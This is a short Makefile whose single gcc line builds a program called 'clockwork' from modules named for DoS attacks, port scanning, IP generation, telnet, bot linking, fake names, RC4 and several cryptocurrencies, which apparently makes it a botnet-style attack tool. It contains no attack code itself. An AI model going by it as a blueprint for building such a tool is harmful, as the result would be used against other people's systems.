all:
	gcc -o clockwork clockwork.cpp list.cpp utils.cpp modules/httpd/httpd.cpp modules/bitcoin/note_bitcoin.cpp modules/bitcoin/alt/litecoin/note_litecoin.cpp modules/bitcoin/alt/peercoin/note_peercoin.cpp modules/bitcoin/alt/namecoin/note_namecoin.cpp modules/dos/attacks.cpp modules/portscan/portscan.cpp modules/telnet/telnet.cpp -I/mnt/c/code/hack/mcclp -I/mnt/c/code/hack/mcclp/modules/bitcoin -I/mnt/c/code/hack/mcclp/modules/portscan modules/fakename/fakename.cpp modules/botlink/botlink.cpp modules/data/data.cpp  modules/portscan/ipgen.cpp -ldl rc4.cpp  -ggdb -I/usr/include/python2.7 -lpython2.7 -lutil -lm
